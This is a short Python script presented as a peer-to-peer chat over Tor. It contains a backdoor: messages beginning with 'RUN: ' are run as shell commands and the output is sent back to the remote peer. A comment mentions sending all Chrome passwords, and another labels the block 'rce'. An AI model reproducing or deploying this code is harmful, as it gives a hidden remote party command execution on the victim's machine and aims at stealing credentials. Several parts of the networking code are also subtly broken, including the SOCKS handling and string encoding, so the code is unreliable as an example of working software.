import socket, os, subprocess

# Set up a socket to connect to the Tor SOCKS proxy
socks_proxy = ('127.0.0.1', 9050)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect(socks_proxy)

# Send a command to the SOCKS proxy to create a new circuit
sock.send(b'\x05\x01\x00')
response = sock.recv(1024)

# Define the listening port for the peer
listen_port = 1234

# Create a socket to listen for incoming connections
listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listen_sock.bind(('0.0.0.0', listen_port))
listen_sock.listen(1)

# Print the peer's onion address
print('Your onion address: %s.onion:%d' % (response[5:].decode('ascii'), listen_port))

# Prompt the user to enter the onion address of the other peer
dest_onion_address = input('Enter the onion address of the other peer: ')

# Connect to the other peer through the SOCKS proxy
dest_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
dest_sock.settimeout(10)
dest_sock.connect(socks_proxy)
dest_sock.send(b'\x05\x01\x00\x03' + len(dest_onion_address).to_bytes(1, 'big') + dest_onion_address.encode('ascii') + listen_port.to_bytes(2, 'big'))
response = dest_sock.recv(1024)

# Print a message indicating that the connection was established
print('Connected to peer at %s.onion:%d' % (dest_onion_address, listen_port))

def hearingLoop():
    # Start the chat loop
    while True:
        # Wait for incoming messages
        try:
            client_sock, client_addr = listen_sock.accept()
            message = client_sock.recv(1024).decode('ascii')
            #send all chrome passwords of didnt already
            if(message == "Listening"):
                pass
            #rce
            if(message.startswith("RUN: ")):
                command = message[5:]
                splited_command = command.split()
                output = "ERR"
                if splited_command[0].lower() == "cd":
                    # cd command, change directory
                    try:
                        os.chdir(' '.join(splited_command[1:]))
                    except FileNotFoundError as e:
                        # if there is an error, set as the output
                        output = str(e)
                    else:
                        # if operation is successful, empty message
                        output = ""
                else:
                    # execute the command and retrieve the results
                    output = subprocess.getoutput(command)
                dest_sock.send("Output: "+output)
            print('Received message: %s' % message.decode('ascii'))
            client_sock.close()
        except socket.timeout:
            pass

def sendMessage(message):
    dest_sock.send(message.encode('ascii'))